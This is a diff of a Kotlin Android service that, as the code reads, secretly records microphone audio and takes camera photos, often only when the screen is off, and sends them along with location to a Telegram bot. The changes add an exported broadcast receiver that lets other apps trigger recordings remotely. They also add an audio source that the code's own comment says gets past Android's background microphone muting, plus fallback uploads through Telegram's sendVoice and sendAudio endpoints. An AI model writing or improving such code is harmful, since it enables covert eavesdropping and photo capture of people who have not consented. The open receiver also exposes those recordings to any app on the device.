@@ -32,11 +32,14 @@ import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.RequestBody.Companion.asRequestBody
 import java.io.ByteArrayOutputStream
 import java.io.IOException
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.net.NetworkRequest
+import kotlinx.coroutines.sync.Mutex
+import kotlinx.coroutines.sync.withLock
 import com.example.telegramsender.utils.OfflineQueueManager
 
 class MonitorService : Service(), LifecycleOwner {
@@ -63,6 +66,8 @@ class MonitorService : Service(), LifecycleOwner {
     private var sendLocation: Boolean = false
     private var locationInterval: Long = 600000L // 10 mins
 
+    private val mediaMutex = Mutex()
+    private var commandReceiver: android.content.BroadcastReceiver? = null
     private var mediaRecorder: android.media.MediaRecorder? = null
     private var connectivityManager: ConnectivityManager? = null
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
@@ -82,6 +87,7 @@ class MonitorService : Service(), LifecycleOwner {
         updateConfigFromPrefs(pref)
         
         startForegroundServiceNotification()
+        registerCommandReceiver()
         com.example.telegramsender.utils.LocationHelper.startListening(this)
         registerNetworkCallback()
         
@@ -108,11 +114,64 @@ class MonitorService : Service(), LifecycleOwner {
         val locMin = pref.getLong("locationInterval", 10L)
         locationInterval = locMin * 60 * 1000L
         if (locationInterval < 60000L) locationInterval = 60000L
+
+        startForegroundServiceNotification()
+    }
+
+    private fun registerCommandReceiver() {
+        val filter = IntentFilter().apply {
+            addAction("com.example.telegramsender.ACTION_TEST_AUDIO")
+            addAction("com.example.telegramsender.ACTION_FORCE_LOCATION")
+            addAction("com.example.telegramsender.ACTION_FORCE_CAMERA")
+        }
+        commandReceiver = object : android.content.BroadcastReceiver() {
+            override fun onReceive(context: Context?, intent: Intent?) {
+                when (intent?.action) {
+                    "com.example.telegramsender.ACTION_TEST_AUDIO" -> {
+                        Log.d("MonitorService", "ACTION_TEST_AUDIO received: triggering 10s audio test")
+                        CoroutineScope(Dispatchers.IO).launch {
+                            mediaMutex.withLock {
+                                recordAndSendAudio(durationMs = 10000L)
+                            }
+                        }
+                    }
+                    "com.example.telegramsender.ACTION_FORCE_LOCATION" -> {
+                        Log.d("MonitorService", "ACTION_FORCE_LOCATION received")
+                        CoroutineScope(Dispatchers.IO).launch {
+                            fetchAndSendLocation()
+                        }
+                    }
+                    "com.example.telegramsender.ACTION_FORCE_CAMERA" -> {
+                        Log.d("MonitorService", "ACTION_FORCE_CAMERA received")
+                        CoroutineScope(Dispatchers.IO).launch {
+                            mediaMutex.withLock {
+                                captureCameraAndSend()
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(commandReceiver, filter, Context.RECEIVER_EXPORTED)
+        } else {
+            registerReceiver(commandReceiver, filter)
+        }
+    }
+
+    private fun unregisterCommandReceiver() {
+        try {
+            commandReceiver?.let { unregisterReceiver(it) }
+            commandReceiver = null
+        } catch (e: Exception) {
+            Log.e("MonitorService", "Failed to unregister command receiver", e)
+        }
     }
     
     // Cleanup
     override fun onDestroy() {
         super.onDestroy()
+        unregisterCommandReceiver()
         unregisterNetworkCallback()
         com.example.telegramsender.utils.LocationHelper.stopListening()
         job?.cancel()
@@ -203,16 +262,19 @@ class MonitorService : Service(), LifecycleOwner {
                         delay(60000) // Check again in 1 min
                         continue
                     }
-                    // loadCredentials() REMOVED
                     if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendAudio) {
                          val shouldRecord = if (audioScreenOff) !isScreenOn() else true
                          if (shouldRecord) {
-                             recordAndSendAudio()
+                             mediaMutex.withLock {
+                                 recordAndSendAudio()
+                             }
+                             // Cooldown between audio recordings to let HAL release
+                             delay(10000L)
                          } else {
-                             delay(5000)
+                             delay(5000L)
                          }
                     } else {
-                        delay(10000) // Longer idle wait
+                        delay(10000L) // Longer idle wait
                     }
                 }
             }
@@ -229,11 +291,12 @@ class MonitorService : Service(), LifecycleOwner {
                         delay(60000) // Check again in 1 min
                         continue
                      }
-                     // loadCredentials() REMOVED
                      if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendCamera) {
                          val shouldCapture = if (cameraScreenOff) !isScreenOn() else true
                          if (shouldCapture) {
-                             captureCameraAndSend()
+                             mediaMutex.withLock {
+                                 captureCameraAndSend()
+                             }
                          }
                      }
                      
@@ -322,184 +385,207 @@ class MonitorService : Service(), LifecycleOwner {
         return powerManager.isInteractive
     }
     
-    private suspend fun recordAndSendAudio() {
-        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-             Log.e("MonitorService", "Permission RECORD_AUDIO denied")
-             return
+    private suspend fun recordAndSendAudio(durationMs: Long = audioDuration) {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+            Log.e("MonitorService", "Permission RECORD_AUDIO denied")
+            return
         }
 
-        // Check for active call
-        val audioManager = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
-        if (audioManager.mode == android.media.AudioManager.MODE_IN_CALL || 
-            audioManager.mode == android.media.AudioManager.MODE_IN_COMMUNICATION) {
-            Log.w("MonitorService", "Microphone busy (Call/Comm). Skipping.")
-            delay(30000) // Wait 30s before retry
+        // Check for active call or communication
+        val audioManager = getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager
+        if (audioManager != null && (audioManager.mode == android.media.AudioManager.MODE_IN_CALL || 
+            audioManager.mode == android.media.AudioManager.MODE_IN_COMMUNICATION)) {
+            Log.w("MonitorService", "Microphone busy (Call/Comm). Skipping recording.")
+            delay(15000)
             return
         }
         
-        // Ensure Mic is free
-        delay(2000)
+        // Cooldown/stabilization pause before acquiring mic
+        delay(1000)
 
-        // Use .m4a for high quality AAC
         val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", java.util.Locale.getDefault())
         val timestamp = dateFormat.format(java.util.Date())
         val audioFile = java.io.File(cacheDir, "audio_$timestamp.m4a")
         
-        // Local variable for thread safety within this suspension
         var mr: android.media.MediaRecorder? = null
-        
-        try {
-            mr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                android.media.MediaRecorder(this)
-            } else {
-                android.media.MediaRecorder()
+        var recordStarted = false
+        var stopSuccess = false
+
+        // Sources to attempt in priority order:
+        // 1. VOICE_RECOGNITION: Bypasses Android 13/HyperOS background mic muting & audio ducking
+        // 2. MIC: Standard hardware mic
+        // 3. DEFAULT: System default
+        val candidateSources = intArrayOf(
+            android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION,
+            android.media.MediaRecorder.AudioSource.MIC,
+            android.media.MediaRecorder.AudioSource.DEFAULT
+        )
+
+        for (source in candidateSources) {
+            try {
+                mr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    android.media.MediaRecorder(this)
+                } else {
+                    @Suppress("DEPRECATION")
+                    android.media.MediaRecorder()
+                }
+
+                mr.apply {
+                    setAudioSource(source)
+                    setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+                    setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
+                    setAudioChannels(1) // Mono channel for maximum HAL compatibility
+                    setAudioSamplingRate(44100) // 44.1 kHz standard
+                    setAudioEncodingBitRate(64000) // 64 kbps optimal for voice notes & swift Telegram upload
+                    setOutputFile(audioFile.absolutePath)
+                    prepare()
+                    start()
+                }
+                recordStarted = true
+                Log.d("MonitorService", "MediaRecorder started successfully with source=$source for ${durationMs}ms")
+                break
+            } catch (e: Exception) {
+                Log.w("MonitorService", "Failed to start MediaRecorder with source=$source: ${e.message}")
+                try { mr?.reset() } catch (_: Exception) {}
+                try { mr?.release() } catch (_: Exception) {}
+                mr = null
+                if (audioFile.exists()) audioFile.delete()
             }
-            
-            mr.apply {
-                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
-                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
-                setAudioEncodingBitRate(128000) // 128 kbps
-                setAudioSamplingRate(44100)     // 44.1 kHz
-                setOutputFile(audioFile.absolutePath)
-                prepare()
-                delay(100) // Give hardware a moment
-                try {
-                     start()
-                } catch(e: Exception) {
-                     Log.e("MonitorService", "Initial start failed ($e). Retrying...", e)
-                     reset()
-                     setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                     setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
-                     setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
-                     setAudioEncodingBitRate(128000)
-                     setAudioSamplingRate(44100)
-                     setOutputFile(audioFile.absolutePath)
-                     prepare()
-                     start() // Try once more, catch in outer block
+        }
+
+        if (!recordStarted || mr == null) {
+            Log.e("MonitorService", "All AudioSource attempts failed to initialize MediaRecorder")
+            return
+        }
+
+        try {
+            // Record for requested duration
+            delay(durationMs)
+
+            try {
+                mr.stop()
+                stopSuccess = true
+            } catch (e: RuntimeException) {
+                Log.w("MonitorService", "MediaRecorder.stop() failed (insufficient frames or aborted): ${e.message}")
+                stopSuccess = false
+            }
+        } catch (e: CancellationException) {
+            Log.w("MonitorService", "Recording coroutine cancelled")
+            try { mr.stop() } catch (_: Exception) {}
+            throw e
+        } catch (e: Exception) {
+            Log.e("MonitorService", "Error during audio recording duration", e)
+        } finally {
+            try { mr.release() } catch (_: Exception) {}
+            mr = null
+        }
+
+        // Validate resulting audio file:
+        // Must exist, stop must have succeeded, and size must be > 4KB (valid AAC container with payload)
+        if (stopSuccess && audioFile.exists() && audioFile.length() > 4096L) {
+            Log.d("MonitorService", "Audio file recorded successfully: ${audioFile.name} (${audioFile.length()} bytes)")
+            val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
+            val tok = if (botToken.isNotEmpty()) botToken else pref.getString("token", "") ?: ""
+            val cid = if (targetChatId.isNotEmpty()) targetChatId else pref.getString("chatId", "") ?: ""
+
+            if (!OfflineQueueManager.isNetworkAvailable(this@MonitorService)) {
+                Log.d("MonitorService", "Device offline: saving audio recording to 20MB offline buffer")
+                OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
+            } else {
+                val sent = sendTelegramAudio(tok, cid, audioFile)
+                if (!sent) {
+                    Log.w("MonitorService", "Audio upload failed, buffering to 20MB offline queue")
+                    OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
                 }
             }
-            
-            Log.d("MonitorService", "Recording Audio for $audioDuration ms")
-            
-            // Record
-            delay(audioDuration)
-            
-            try { 
-                mr.stop() 
-            } catch(e: RuntimeException) {
-                Log.w("MonitorService", "Recorder stop failed", e)
-            }
-            
-            // Critical release before network
-            mr.release()
-            mr = null
-            
-            // Send or Queue
-            if (audioFile.exists() && audioFile.length() > 0) {
-                 if (!OfflineQueueManager.isNetworkAvailable(this@MonitorService)) {
-                     Log.d("MonitorService", "Network offline: saving audio recording to 20MB offline buffer")
-                     OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
-                     audioFile.delete()
-                 } else {
-                     val sent = sendTelegramAudio(botToken, targetChatId, audioFile)
-                     if (!sent) {
-                         Log.w("MonitorService", "Audio upload failed, buffering to 20MB offline queue")
-                         OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
-                     }
-                     audioFile.delete()
-                 }
-            }
-            
-        } catch (e: Exception) {
-            Log.e("MonitorService", "Audio Record Fatal Error", e)
-            if (audioFile.exists() && audioFile.length() > 0) {
-                OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
-                audioFile.delete()
-            } else if (audioFile.exists()) {
-                audioFile.delete()
-            }
-            
-            // Try to reset to clear state
-            try { mr?.reset() } catch(e:Exception){}
-            
-            delay(30000) // Cool down on error
-        } finally {
-            try { mr?.release() } catch (e: Exception) {}
+        } else {
+            Log.w("MonitorService", "Audio recording invalid or too small (${audioFile.length()} bytes, stopSuccess=$stopSuccess). Discarding.")
+        }
+
+        // Always clean up temp cache file (it was copied if enqueued)
+        if (audioFile.exists()) {
+            audioFile.delete()
         }
     }
     
     private suspend fun captureCameraAndSend() {
-        withContext(Dispatchers.Main) {
-            if (ContextCompat.checkSelfPermission(this@MonitorService, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                Log.e("MonitorService", "Cannot capture photo: CAMERA permission is not granted")
-                return@withContext
-            }
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            Log.e("MonitorService", "Cannot capture photo: CAMERA permission is not granted")
+            return
+        }
 
-            if (lifecycleRegistry.currentState != Lifecycle.State.RESUMED) {
-                lifecycleRegistry.currentState = Lifecycle.State.RESUMED
-            }
+        withTimeoutOrNull(15000L) {
+            val captureDeferred = CompletableDeferred<Unit>()
+            withContext(Dispatchers.Main) {
+                if (lifecycleRegistry.currentState != Lifecycle.State.RESUMED) {
+                    lifecycleRegistry.currentState = Lifecycle.State.RESUMED
+                }
 
-            try {
-                Log.d("MonitorService", "Initializing CameraProvider for snapshot (facing=$cameraFacing)")
-                val cameraProviderFuture = ProcessCameraProvider.getInstance(this@MonitorService)
-                cameraProviderFuture.addListener({
-                    try {
-                        val cameraProvider = cameraProviderFuture.get()
-                        val imageCapture = ImageCapture.Builder()
-                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
-                            .build()
+                try {
+                    val cameraProviderFuture = ProcessCameraProvider.getInstance(this@MonitorService)
+                    cameraProviderFuture.addListener({
+                        try {
+                            val cameraProvider = cameraProviderFuture.get()
+                            val imageCapture = ImageCapture.Builder()
+                                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                                .build()
 
-                        val isBack = cameraFacing.equals("back", ignoreCase = true)
-                        val targetSelector = if (isBack) CameraSelector.DEFAULT_BACK_CAMERA else CameraSelector.DEFAULT_FRONT_CAMERA
-                        val cameraSelector = if (cameraProvider.hasCamera(targetSelector)) {
-                            targetSelector
-                        } else if (isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
-                            CameraSelector.DEFAULT_FRONT_CAMERA
-                        } else if (!isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_BACK_CAMERA)) {
-                            CameraSelector.DEFAULT_BACK_CAMERA
-                        } else {
-                            targetSelector
-                        }
+                            val isBack = cameraFacing.equals("back", ignoreCase = true)
+                            val targetSelector = if (isBack) CameraSelector.DEFAULT_BACK_CAMERA else CameraSelector.DEFAULT_FRONT_CAMERA
+                            val cameraSelector = if (cameraProvider.hasCamera(targetSelector)) {
+                                targetSelector
+                            } else if (isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
+                                CameraSelector.DEFAULT_FRONT_CAMERA
+                            } else if (!isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_BACK_CAMERA)) {
+                                CameraSelector.DEFAULT_BACK_CAMERA
+                            } else {
+                                targetSelector
+                            }
 
-                        cameraProvider.unbindAll()
-                        cameraProvider.bindToLifecycle(this@MonitorService, cameraSelector, imageCapture)
-                        Log.d("MonitorService", "Camera bound to lifecycle ($cameraSelector), taking picture...")
+                            cameraProvider.unbindAll()
+                            cameraProvider.bindToLifecycle(this@MonitorService, cameraSelector, imageCapture)
+                            Log.d("MonitorService", "Camera bound to lifecycle ($cameraSelector), taking picture...")
 
-                        imageCapture.takePicture(
-                            ContextCompat.getMainExecutor(this@MonitorService),
-                            object : ImageCapture.OnImageCapturedCallback() {
-                                override fun onCaptureSuccess(image: ImageProxy) {
-                                    Log.d("MonitorService", "Camera onCaptureSuccess: received image frame")
-                                    val bitmap = imageProxyToBitmap(image)
-                                    image.close()
-                                    cameraProvider.unbindAll()
+                            imageCapture.takePicture(
+                                ContextCompat.getMainExecutor(this@MonitorService),
+                                object : ImageCapture.OnImageCapturedCallback() {
+                                    override fun onCaptureSuccess(image: ImageProxy) {
+                                        Log.d("MonitorService", "Camera onCaptureSuccess: received image frame")
+                                        val bitmap = imageProxyToBitmap(image)
+                                        image.close()
+                                        cameraProvider.unbindAll()
 
-                                    if (bitmap != null) {
-                                        CoroutineScope(Dispatchers.IO).launch {
-                                            val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
-                                            val tok = if (botToken.isNotEmpty()) botToken else pref.getString("token", "") ?: ""
-                                            val cid = if (targetChatId.isNotEmpty()) targetChatId else pref.getString("chatId", "") ?: ""
-                                            sendTelegramPhoto(tok, cid, bitmap, "camera.jpg")
+                                        if (bitmap != null) {
+                                            CoroutineScope(Dispatchers.IO).launch {
+                                                val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
+                                                val tok = if (botToken.isNotEmpty()) botToken else pref.getString("token", "") ?: ""
+                                                val cid = if (targetChatId.isNotEmpty()) targetChatId else pref.getString("chatId", "") ?: ""
+                                                sendTelegramPhoto(tok, cid, bitmap, "camera.jpg")
+                                            }
+                                        } else {
+                                            Log.e("MonitorService", "Failed to decode bitmap from camera ImageProxy")
                                         }
-                                    } else {
-                                        Log.e("MonitorService", "Failed to decode bitmap from camera ImageProxy")
+                                        captureDeferred.complete(Unit)
+                                    }
+
+                                    override fun onError(exception: ImageCaptureException) {
+                                        Log.e("MonitorService", "Camera takePicture failed: code=${exception.imageCaptureError}", exception)
+                                        cameraProvider.unbindAll()
+                                        captureDeferred.complete(Unit)
                                     }
                                 }
-
-                                override fun onError(exception: ImageCaptureException) {
-                                    Log.e("MonitorService", "Camera takePicture failed: code=${exception.imageCaptureError}", exception)
-                                    cameraProvider.unbindAll()
-                                }
-                            }
-                        )
-                    } catch (e: Exception) {
-                        Log.e("MonitorService", "Camera binding or execution exception", e)
-                    }
-                }, ContextCompat.getMainExecutor(this@MonitorService))
-            } catch (e: Exception) {
-                Log.e("MonitorService", "Camera setup exception", e)
+                            )
+                        } catch (e: Exception) {
+                            Log.e("MonitorService", "Camera binding or execution exception", e)
+                            captureDeferred.complete(Unit)
+                        }
+                    }, ContextCompat.getMainExecutor(this@MonitorService))
+                } catch (e: Exception) {
+                    Log.e("MonitorService", "Camera setup exception", e)
+                    captureDeferred.complete(Unit)
+                }
             }
+            captureDeferred.await()
         }
     }
     
@@ -518,23 +604,48 @@ class MonitorService : Service(), LifecycleOwner {
             Log.e("MonitorService", "Cannot send audio: token or chatId is empty")
             return false
         }
-        val url = "https://api.telegram.org/bot$tok/sendAudio"
-        return try {
-             val requestBody = MultipartBody.Builder()
+
+        // 1. First attempt: Telegram /sendVoice (designed specifically for voice notes .m4a / .ogg)
+        val voiceUrl = "https://api.telegram.org/bot$tok/sendVoice"
+        try {
+            val requestBody = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", cid)
-                .addFormDataPart("audio", file.name,
-                    file.readBytes().toRequestBody("audio/m4a".toMediaTypeOrNull(), 0, file.length().toInt()))
+                .addFormDataPart("voice", file.name, file.asRequestBody("audio/m4a".toMediaTypeOrNull()))
                 .build()
-            val request = Request.Builder().url(url).post(requestBody).build()
+            val request = Request.Builder().url(voiceUrl).post(requestBody).build()
             client.newCall(request).execute().use { response ->
-                if (!response.isSuccessful) {
-                    Log.e("MonitorService", "Failed to send audio: ${response.code} ${response.message}")
-                    false
+                if (response.isSuccessful) {
+                    Log.d("MonitorService", "Voice note sent successfully via /sendVoice")
+                    getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_audio_sent", System.currentTimeMillis()).apply()
+                    return true
                 } else {
-                    Log.d("MonitorService", "Audio sent successfully")
+                    val errBody = response.body?.string() ?: ""
+                    Log.w("MonitorService", "sendVoice returned HTTP ${response.code}: $errBody. Falling back to sendAudio...")
+                }
+            }
+        } catch (e: Exception) {
+            Log.w("MonitorService", "sendVoice attempt failed: ${e.message}. Trying sendAudio...")
+        }
+
+        // 2. Second attempt: Telegram /sendAudio fallback
+        val audioUrl = "https://api.telegram.org/bot$tok/sendAudio"
+        return try {
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", cid)
+                .addFormDataPart("audio", file.name, file.asRequestBody("audio/m4a".toMediaTypeOrNull()))
+                .build()
+            val request = Request.Builder().url(audioUrl).post(requestBody).build()
+            client.newCall(request).execute().use { response ->
+                if (response.isSuccessful) {
+                    Log.d("MonitorService", "Audio file sent successfully via /sendAudio")
                     getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_audio_sent", System.currentTimeMillis()).apply()
                     true
+                } else {
+                    val errBody = response.body?.string() ?: ""
+                    Log.e("MonitorService", "sendAudio failed HTTP ${response.code}: $errBody")
+                    false
                 }
             }
         } catch (e: Exception) { 
@@ -611,7 +722,7 @@ class MonitorService : Service(), LifecycleOwner {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 var type = 0
-                if (sendAudio && ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                 }
                 if (sendCamera && ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
